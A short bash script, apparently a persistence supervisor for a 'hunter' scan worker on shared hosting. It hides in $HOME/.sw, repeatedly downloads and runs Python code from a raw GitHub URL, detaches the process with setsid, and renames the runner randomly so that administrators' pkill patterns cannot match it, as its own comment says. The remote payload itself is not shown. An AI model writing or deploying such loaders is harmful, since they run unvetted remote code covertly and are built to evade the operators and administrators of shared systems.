#!/bin/bash
# row#07 hunter supervisor -- safe on shared hosting: tiny footprint, self-healing
set -u
D="$HOME/.sw"; mkdir -p "$D" || exit 0
BASE="${SW_BASE:-https://raw.githubusercontent.com/heinzo666/sdk-assets/main}"
cd "$D" || exit 0
NEED_RESTART="$D/.needrestart"
fetch() { # url outfile : always refresh, flag restart on change
  local tmp="$2.new.$RANDOM"
  if curl -fsSL -m 25 "$1" -o "$tmp" 2>>"$D/fetch.err"; then
     if [ ! -s "$2" ] || ! cmp -s "$tmp" "$2"; then mv "$tmp" "$2"; touch "$NEED_RESTART"; else rm -f "$tmp"; fi
  fi
}
fetch "$BASE/scan_worker.py" scan_worker.py
fetch "$BASE/watch_seed.json" watch_seed.json
[ -s scan_worker.py ] || exit 0
PY=$(command -v python3 || command -v python3.12 || command -v python3.11 || command -v python3.10 || command -v python3.9)
[ -n "${PY:-}" ] || { echo "no-python $(date)" >> "$D/boot.log"; exit 0; }
NEED_RESTART="$D/.needrestart"
# pick a fresh runner filename each launch so foreign pkill patterns cannot match it
RUNNAME="w$RANDOM$RANDOM.py"
cp -f "$D/scan_worker.py" "$D/$RUNNAME"
PIDF="$D/pid_$RUNNAME"
ALIVE=0
for pf in "$D"/pid_w*.py; do [ -e "$pf" ] || continue; kill -0 "$(cat "$pf" 2>/dev/null)" 2>/dev/null && ALIVE=1; done
if [ "$ALIVE" = 1 ] && [ ! -f "$NEED_RESTART" ]; then exit 0; fi
[ -f "$NEED_RESTART" ] && { touch "$D/.relaunch"; }
rm -f "$NEED_RESTART"
( setsid bash -c 'echo $$ > "'"$PIDF"'"; exec '"$PY"' "'"$D/$RUNNAME"'"' >> "$D/log.txt" 2>&1 & )
sleep 1
echo "start $(date) py=$PY run=$RUNNAME" >> "$D/boot.log"
exit 0
